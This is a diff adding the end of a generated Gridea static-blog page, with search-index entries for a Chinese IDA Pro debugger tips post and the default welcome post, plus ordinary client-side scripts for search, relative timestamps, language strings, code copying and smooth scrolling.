+&lt;li&gt;运行命令&lt;code&gt;cmd&lt;/code&gt;,安装python到自定义路径，按照说明升级pip、安装keystone-engine和six&lt;/li&gt;
+&lt;li&gt;在debugger中填写各种必要项，注意反斜杠和分盘（ios设备路径用正斜杠），填写host:port并手动启动debugserver即可成功。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;关于F5报错：安装&lt;a href=&#34;https://www.chinapyg.com/forum.php?mod=viewthread&amp;amp;tid=149566&amp;amp;highlight=IDA%2Bpro%2B8.3&#34;&gt;该链接&lt;/a&gt;覆盖文件即可&lt;/p&gt;
+">IDA pro debugger初尝避坑指南</a>
+      </div>
+      
+      <div class="item">
+        <a class="result-title" style="opacity: 0;" href="https://AegeanYan.github.io/post/hello-gridea/"" data-c="
+          &lt;p&gt;👏  欢迎使用 &lt;strong&gt;Gridea&lt;/strong&gt; ！&lt;br&gt;
+✍️  &lt;strong&gt;Gridea&lt;/strong&gt; 一个静态博客写作客户端。你可以用它来记录你的生活、心情、知识、笔记、创意... ...&lt;/p&gt;
+&lt;!-- more --&gt;
+&lt;p&gt;&lt;a href=&#34;https://github.com/getgridea/gridea&#34;&gt;Github&lt;/a&gt;&lt;br&gt;
+&lt;a href=&#34;https://gridea.dev/&#34;&gt;Gridea 主页&lt;/a&gt;&lt;br&gt;
+&lt;a href=&#34;https://fehey.com/&#34;&gt;示例网站&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&#34;特性&#34;&gt;特性👇&lt;/h2&gt;
+&lt;p&gt;📝  你可以使用最酷的 &lt;strong&gt;Markdown&lt;/strong&gt; 语法，进行快速创作&lt;/p&gt;
+&lt;p&gt;🌉  你可以给文章配上精美的封面图和在文章任意位置插入图片&lt;/p&gt;
+&lt;p&gt;🏷️  你可以对文章进行标签分组&lt;/p&gt;
+&lt;p&gt;📋  你可以自定义菜单，甚至可以创建外部链接菜单&lt;/p&gt;
+&lt;p&gt;💻  你可以在 &lt;strong&gt;Windows&lt;/strong&gt;，&lt;strong&gt;MacOS&lt;/strong&gt; 或 &lt;strong&gt;Linux&lt;/strong&gt; 设备上使用此客户端&lt;/p&gt;
+&lt;p&gt;🌎  你可以使用 &lt;strong&gt;𝖦𝗂𝗍𝗁𝗎𝖻 𝖯𝖺𝗀𝖾𝗌&lt;/strong&gt; 或 &lt;strong&gt;Coding Pages&lt;/strong&gt; 向世界展示，未来将支持更多平台&lt;/p&gt;
+&lt;p&gt;💬  你可以进行简单的配置，接入 &lt;a href=&#34;https://github.com/gitalk/gitalk&#34;&gt;Gitalk&lt;/a&gt; 或 &lt;a href=&#34;https://github.com/SukkaW/DisqusJS&#34;&gt;DisqusJS&lt;/a&gt; 评论系统&lt;/p&gt;
+&lt;p&gt;🇬🇧  你可以使用&lt;strong&gt;中文简体&lt;/strong&gt;或&lt;strong&gt;英语&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;🌁  你可以任意使用应用内默认主题或任意第三方主题，强大的主题自定义能力&lt;/p&gt;
+&lt;p&gt;🖥  你可以自定义源文件夹，利用 OneDrive、百度网盘、iCloud、Dropbox 等进行多设备同步&lt;/p&gt;
+&lt;p&gt;🌱 当然 &lt;strong&gt;Gridea&lt;/strong&gt; 还很年轻，有很多不足，但请相信，它会不停向前 🏃&lt;/p&gt;
+&lt;p&gt;未来，它一定会成为你离不开的伙伴&lt;/p&gt;
+&lt;p&gt;尽情发挥你的才华吧！&lt;/p&gt;
+&lt;p&gt;😘 Enjoy~&lt;/p&gt;
+">Hello Gridea</a>
+      </div>
+      
+    </div>
+    <div class="page">
+      <div id="page_ul"></div>
+    </div>
+  </div>
+</div>
+<script>
+  !function () {
+    let searchMask = document.querySelector('#search_mask');
+    let result = document.querySelector('#result');
+    let items = document.querySelectorAll('.item');
+    let searchBox = document.querySelector('#search');
+    let statCount = document.querySelector('#stat_count');
+    let statTimes = document.querySelector('#stat_times');
+    let pageUl = document.querySelector('#page_ul');
+    let close = document.querySelector('#close');
+    
+    close.addEventListener('click', function() {
+      searchMask.style = 'display: none;'
+    })
+
+    let finds = [];
+    let contents = [];
+    let pageSize = 10;
+    items.forEach(item => {
+      let a = item.querySelector('a');
+      contents.push({
+        title: a.innerText,
+        details: a.dataset.c,
+        link: a.href
+      })
+      item.remove();
+    })
+
+    function insertStr(soure, start, count) {
+      let newStr = soure.substr(start, count);
+      return soure.slice(0, start) + '<em>' + newStr + '</em>' + soure.slice(start + count);
+    }
+
+    pageUl.addEventListener('click', function(event) {
+      let target = event.target;
+      if (target.__proto__ === HTMLSpanElement.prototype) {
+        appendResults(parseInt(target.dataset.i));
+      }
+    })
+
+    function appendResults(index) {
+      let htmlResult = '';
+      let start = index || 0;
+      let end = Math.min(start + pageSize, finds.length);
+      for (let i = start; i < end; i++) {
+        const current = finds[i];
+        let html = current.title;
+        let sum = 0;
+        let positions = current.positions;
+        positions.forEach(position => {
+          html = insertStr(html, position.start + sum, position.count);
+          sum += 9;
+        })
+        htmlResult += `<div class="item"><a class="result-title" href="${current.link}">${html}</a></div>`;
+      }
+      result.innerHTML = htmlResult;
+      pageUl.innerHTML = '';
+      let count = finds.length / pageSize;
+      let lis = '';
+      if (start !== 0) {
+        lis += `<span class="fa fa-angle-left" data-i='${start - 1}'></span>`;
+      }
+      for (let i = 0; i < count; i++) {
+        lis += `<span class='${i === start?'current':''}' data-i='${i}'>${i+1}</span>`;     
+      }
+      if (start+1 < count) {
+        lis += `<span class="fa fa-angle-right" data-i='${start+1}'></span>`;  
+      }
+      pageUl.innerHTML = lis;
+    }
+
+    function search(delay) {
+      let timer = null
+      return function () {
+        clearTimeout(timer)
+        timer = setTimeout(() => {
+          let start = Date.now();
+          let segments = searchBox.value.split(' ').filter(c => c != '');
+          if (segments.length <= 0) {
+            return;
+          }
+          finds = [];
+          let htmlResult = '';
+          contents.forEach(content => {
+            let title = content.title;
+            let positions = [];
+            let find = false;
+            segments.forEach((segment) => {
+              if (content.title.includes(segment)) {
+                find = true;
+                positions.push({
+                  start: content.title.indexOf(segment),
+                  count: segment.length
+                })
+              } else if (content.details.includes(segment)) {
+                find = true;
+              }
+            });
+            if (find) {
+              finds.push({
+                title: content.title,
+                link: content.link,
+                positions
+              });
+            }
+          })
+          appendResults(0);
+          statCount.textContent = finds.length;
+          statTimes.textContent = Date.now() - start;
+        }, delay)
+      }
+    }
+    searchBox.addEventListener('input', search(200));
+  }()
+</script>
+
+<input hidden id="copy" />
+<script>
+  !function () {
+    let times = document.querySelectorAll('.publish-time');
+    for (let i = 0; i < times.length; i++) {
+      let date = times[i].dataset.t;
+      let time = Math.floor((new Date().getTime() - new Date(date).getTime()) / 1000);
+      if (time < 60) {
+        str = time + '秒之前';
+      } else if (time < 3600) {
+        str = Math.floor(time / 60) + '分钟之前';
+      } else if (time >= 3600 && time < 86400) {
+        str = Math.floor(time / 3600) + '小时之前';
+      } else if (time >= 86400 && time < 259200) {
+        str = Math.floor(time / 86400) + '天之前';
+      } else {
+        str = times[i].textContent;
+      }
+      times[i].textContent = str;
+    }
+  }();
+</script>
+
+<script>
+  let language = '';
+  if (language !== '') {
+    let map = new Map();
+    if (language === 'en') {
+      map.set('search', 'Search');
+      map.set('category', 'Categories');
+      map.set('article', 'Articles');
+      map.set('tag', 'Tags');
+      map.set('top', 'Top');
+      map.set('publish', 'published');
+      map.set('minute', ' minutes');
+      map.set('read-more', 'Read More');
+      map.set('view', 'View');
+      map.set('words', ' words');
+      map.set('category-in', 'category in');
+      map.set('preview', 'Meta');
+      map.set('index', 'Toc');
+      map.set('no-archives', "You haven't created yet");
+      map.set('archives', " articles in total");
+      map.set('cloud-tags', " tags in total");
+      map.set('copyright', "Copyright: ");
+      map.set('author', "Author: ");
+      map.set('link', "Link: ");
+      map.set('leave-message', "Leave a message");
+      map.set('format', "Links Format");
+      map.set('site-name', "Name: ");
+      map.set('site-link', "Link: ");
+      map.set('site-desc', "Desc: ");
+      map.set('stat', " related results, taking ");
+      map.set('stat-time', " ms");
+      map.set('site-img', "Image: ");
+    }
+
+    if (map.size > 0) {
+      let lanElems = document.querySelectorAll('.language');
+      lanElems.forEach(elem => {
+        let lan = elem.dataset.lan, text = map.get(lan);
+        if (elem.__proto__ === HTMLInputElement.prototype) {
+          elem.placeholder = text
+        } else {
+          if (elem.dataset.count) {
+            text = elem.dataset.count + text;
+          }
+          elem.textContent = text;
+        }
+      })
+    }
+  }
+
+  window.Clipboard = (function (window, document, navigator) {
+    var textArea,
+      copy;
+
+    // 判断是不是ios端
+    function isOS() {
+      return navigator.userAgent.match(/ipad|iphone/i);
+    }
+    //创建文本元素
+    function createTextArea(text) {
+      textArea = document.createElement('textArea');
+      textArea.value = text;
+      textArea.style.width = 0;
+      textArea.style.height = 0;
+      textArea.clientHeight = 0;
+      textArea.clientWidth = 0;
+      document.body.appendChild(textArea);
+    }
+    //选择内容
+    function selectText() {
+      var range,
+        selection;
+
+      if (isOS()) {
+        range = document.createRange();
+        range.selectNodeContents(textArea);
+        selection = window.getSelection();
+        selection.removeAllRanges();
+        selection.addRange(range);
+        textArea.setSelectionRange(0, 999999);
+      } else {
+        textArea.select();
+      }
+    }
+
+    //复制到剪贴板
+    function copyToClipboard() {
+      try {
+        document.execCommand("Copy")
+      } catch (err) {
+        alert("复制错误！请手动复制！")
+      }
+      document.body.removeChild(textArea);
+    }
+
+    copy = function (text) {
+      createTextArea(text);
+      selectText();
+      copyToClipboard();
+    };
+
+    return {
+      copy: copy
+    };
+  })(window, document, navigator);
+
+  function copyCode(e) {
+    if (e.srcElement.tagName === 'SPAN' && e.srcElement.classList.contains('copy-code')) {
+      let code = e.currentTarget.querySelector('code');
+      var text = code.innerText;
+      if (e.srcElement.textContent === '复制成功') {
+        return;
+      }
+      e.srcElement.textContent = '复制成功';
+      (function (elem) {
+        setTimeout(() => {
+          if (elem.textContent === '复制成功') {
+            elem.textContent = '复制代码'
+          }
+        }, 1000);
+      })(e.srcElement)
+      Clipboard.copy(text);
+    }
+  }
+
+  let pres = document.querySelectorAll('pre');
+  pres.forEach(pre => {
+    let code = pre.querySelector('code');
+    let copyElem = document.createElement('span');
+    copyElem.classList.add('copy-code');
+    copyElem.textContent = '复制代码';
+    pre.appendChild(copyElem);
+    pre.onclick = copyCode
+  })
+
+</script>
+<script src="/media/js/motion.js"></script>
+
+
+  <script
+    src="https://cdn.jsdelivr.net/gh/cferdinandi/smooth-scroll/dist/smooth-scroll.polyfills.min.js"></script>
+  <script>
+    var scroll = new SmoothScroll('a[href*="#"]', {
+      speed: 200
+    });
+  </script>
+
+
+
+
+
+
+
+</html>
